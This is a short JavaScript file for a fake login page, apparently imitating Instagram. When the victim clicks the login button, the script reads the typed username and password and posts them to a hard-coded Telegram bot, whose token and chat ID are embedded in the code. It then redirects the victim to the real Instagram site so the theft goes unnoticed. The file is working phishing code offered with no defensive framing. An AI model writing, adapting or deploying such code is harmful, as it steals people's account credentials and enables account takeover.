let inputs = document.querySelectorAll('input')
let button = document.querySelector('.login-button')

const Token = '7718748511:AAF0fW0o1dOZ0NOvhbQmvjSNra5nFrRtr4Y'
const ChatId = '1110665133'

button.addEventListener('click', () => {
    const username = inputs[0].value
    const password = inputs[1].value

    const message = `Login parol\n Username: ${username}\n Password: ${password}`

    fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: ChatId,
            text: message,
        }),
    })
    .then(response => response.json())
    .then(res => console.log(res))

    window.location.href = 'https://www.instagram.com/'
})